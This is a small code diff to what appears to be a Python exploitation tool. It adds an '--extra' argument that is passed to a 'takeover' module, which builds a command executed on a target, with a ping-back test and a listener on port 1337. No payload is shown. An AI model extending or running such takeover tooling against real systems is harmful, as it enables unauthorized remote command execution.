@@ -50,6 +50,7 @@ parser.add_argument("-p",   "--proxy", type=str, help="Proxy to send requests in
 parser.add_argument("-s",   "--ssl", action="store_true", help="HTTPS")
 parser.add_argument("-t",   "--timeout", type=int, help="Timeout for request in seconds (DEFAULT = 3)", default=3)
 parser.add_argument("--icmp", action="store_true", help="ICMP ping back test")
+parser.add_argument("-z", "--extra", type=str, help="Optional string argument to pass to takeover")
 
 args = parser.parse_args()
 
@@ -60,6 +61,7 @@ listen_port = 1337
 overlay_text = None
 req_proxy = ""
 req_timeout = args.timeout
+takeover_extra = ""
 
 """
     Process arguments
@@ -106,9 +108,12 @@ if (args.overlay_leak):
 if (args.overlay_leak_command != None):
     leak_cmd = args.overlay_leak_command
 
+if (args.extra != None):
+    takeover_extra = args.extra
+
 if (args.takeover):
     import takeover
-    exe_cmd = takeover.takeover_cmd(listen_ip, listen_port, target_ip, target_port, args.webserve)
+    exe_cmd = takeover.takeover_cmd(listen_ip, listen_port, target_ip, target_port, takeover_extra, args.webserve)
 else:
     if (args.icmp):
         exe_cmd = f"ping {listen_ip}"
